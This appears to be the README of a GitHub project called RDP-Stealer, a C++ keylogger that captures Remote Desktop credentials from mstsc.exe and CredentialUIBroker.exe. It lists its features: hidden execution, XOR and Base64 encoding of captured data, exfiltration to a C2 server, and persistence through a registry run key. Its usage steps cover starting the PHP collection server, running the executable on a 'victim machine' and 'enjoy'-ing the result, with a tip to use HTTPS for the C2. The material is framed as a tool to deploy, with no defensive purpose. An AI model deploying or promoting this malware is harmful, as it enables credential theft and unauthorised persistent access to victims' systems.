# RDP-Stealer
The RDP-Stealer is C++ malware that targets Remote Desktop Protocol (RDP) processes. It acts as a keystroke logger, capturing credentials provided by users in RDP and sending back encrypted data to a C2 server.

## Features
- Executes without a visible window (in the background).
- Captures keystrokes in RDP processes using the context of `mstsc.exe` and `CredentialUIBroker.exe`.
- Encrypts the captured data using `XOR` and `BASE64`.
- Sends data to a C2 server.
- Modifies the registry to auto-execute at every reboot.

## TODO 🚧
- Add Schedule Task
- Add Banner

## Usage

1. Create a recvData folder in the directory.
2. Before running the `RDPStealer.exe` on the victim machine, first run the `server.php`.
```php
php -S 0.0.0.0:8000
```
4. Run the `RDPStealer.exe` on the victim machine and enjoy :).
```bash
.\RDPStealer.exe
```
> Note ⚠️
- It is better to use an `HTTPS server` instead of an `HTTP server`.

## POC
https://github.com/Gurpreet06/RDP-Stealer/assets/74554439/117a655e-63eb-409e-a62c-4682eab4a772

